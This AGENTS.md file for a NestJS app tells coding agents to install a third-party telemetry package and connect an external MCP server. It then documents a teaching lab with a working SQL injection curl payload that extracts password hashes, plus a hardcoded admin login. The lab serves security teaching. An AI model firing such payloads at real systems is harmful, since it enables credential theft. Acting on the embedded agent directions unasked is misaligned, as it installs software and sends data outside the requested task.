# AGENTS.md

## Production data: NestJS Observe

This app's production telemetry - traces, errors, logs and metrics - goes to [NestJS Observe](https://observe.nestjs.com). Until `ObserveModule` is registered in `src/app.module.ts`, nothing is sent: `npx @nestjs/observe link` sets it up in one step - it installs `@nestjs/observe`, wires it into the app, and writes the key pair (`OBSERVE_APP_KEY`, `OBSERVE_APP_SECRET`) to `.env`.

When a task depends on how the app behaves in production - an error users hit, a slow endpoint, a failing job, whether a release made things worse - work from that data, not from the code alone:

- The Observe MCP server answers those questions directly: errors with their traces and logs, slow operations, jobs, and what a release changed (`find_regressions`, `diff_release`). It is included on the Pro plan and above. In Claude Code: `claude mcp add observe --transport http https://observe-api.nestjs.com/mcp`, and the client opens a browser to approve. Other clients: https://www.observe.nestjs.com/documentation/mcp
- Without it, the user can open the request or error in the Observe dashboard and click **Copy agent prompt**, which hands over that page's trace, stack and logs as text.

## Lab — Vulnérabilités pédagogiques (LAB_MODE)

Quand `LAB_MODE=true`, des routes vulnérables sont montées sous `/api/v1/lab/...`.
Chaque scénario a sa preuve d'exploitation et sa preuve de blocage.

### WEB-01 — SQL Injection

**Route vulnérable** : `GET /api/v1/lab/employees/search?q=<payload>`

**Exploitation** (LAB_MODE=true) :
```bash
# Connexion préalable pour obtenir un cookie de session
curl -c cookies.txt -X POST http://localhost:3001/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"t.balde","password":"GF_Admin2026!"}'

# Injection UNION exfiltrant username, email et passwordHash de users
curl -b cookies.txt \
  "http://localhost:3001/api/v1/lab/employees/search?q=%27%20UNION%20SELECT%20id%2C%20username%2C%20email%2C%20%22passwordHash%22%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%20FROM%20users%20--"
# → 200, la réponse contient des lignes où lastName = hash argon2 ($argon2id$...)
```

**Blocage** (LAB_MODE=false) :
```bash
# La route /lab/... n'existe pas
curl -b cookies.txt "http://localhost:3001/api/v1/lab/employees/search?q=test"
# → 404

# La route de production /employees/search est interceptée par ParseUUIDPipe
curl -b cookies.txt "http://localhost:3001/api/v1/employees/search?q=test"
# → 400 (ParseUUIDPipe rejette 'search' comme UUID invalide)
```
